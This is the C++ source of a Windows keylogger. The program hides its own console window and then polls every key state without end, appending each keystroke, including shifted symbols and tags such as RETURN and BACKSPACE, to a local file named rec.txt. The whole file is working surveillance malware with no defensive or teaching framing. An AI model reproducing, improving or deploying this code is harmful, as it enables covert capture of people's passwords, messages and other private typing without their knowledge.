// keylogger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include <winuser.h>
#include <fstream>

void logKey();
void hideLog();

int main()
{
	hideLog();
	logKey();

    return 0;
}

void logKey()
{
	char ch;
	for (;;)
	{
		for (ch = 8; ch <= 222; ch++)
		{
			if (GetAsyncKeyState(ch) == -32767)
			{
				std::ofstream outfile("rec.txt", std::ios::app);

				if ((ch > 64 && ch < 91) && !GetAsyncKeyState(0x10))
				{
					ch += 32;
					outfile << ch;
					outfile.close();
					break;
				}
				else if (ch > 64 && ch < 91)
				{
					outfile << ch;
					outfile.close();
					break;
				}
				else
				{
					switch (ch)
					{
					case 48:
					{
						if (GetAsyncKeyState(0x10))
							outfile << ")";
						else
							outfile << "0";
					}
					break;
					case 49:
					{
						if (GetAsyncKeyState(0x10))
							outfile << "!";
						else
							outfile << "1";
					}
					break;
					case 50:
					{
						if (GetAsyncKeyState(0x10))
							outfile << "@";
						else
							outfile << "2";
					}
					break;
					case 51:
					{
						if (GetAsyncKeyState(0x10))
							outfile << "#";
						else
							outfile << "3";
					}
					break;
					case 52:
					{
						if (GetAsyncKeyState(0x10))
							outfile << "$";
						else
							outfile << "4";
					}
					break;
					case 53:
					{
						if (GetAsyncKeyState(0x10))
							outfile << "%";
						else
							outfile << "5";
					}
					break;
					case 54:
					{
						if (GetAsyncKeyState(0x10))
							outfile << "^";
						else
							outfile << "6";
					}
					break;
					case 55:
					{
						if (GetAsyncKeyState(0x10))
							outfile << "&";
						else
							outfile << "7";
					}
					break;
					case 56:
					{
						if (GetAsyncKeyState(0x10))
							outfile << "*";
						else
							outfile << "8";
					}
					break;
					case 57:
					{
						if (GetAsyncKeyState(0x10))
							outfile << "(";
						else
							outfile << "9";
					}
					break;
					case VK_SPACE:
						outfile << " ";
						break;
					case VK_RETURN:
						outfile << "<RETURN>\n";
						break;
					case VK_TAB:
						outfile << "<TAB>";
						break;
					case VK_BACK:
						outfile << "<BACKSPACE>";
						break;
					case VK_ESCAPE:
						outfile << "<ESC>";
						break;
					case VK_DELETE:
						outfile << "<DEL>";
						break;
					}
				}

				/*switch (ch)
				{
				case 8:
					outfile << "<BS>";
				case 13:
					outfile << "<ENTER>\n";
				}*/
			}
		}
	}
}

void hideLog()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}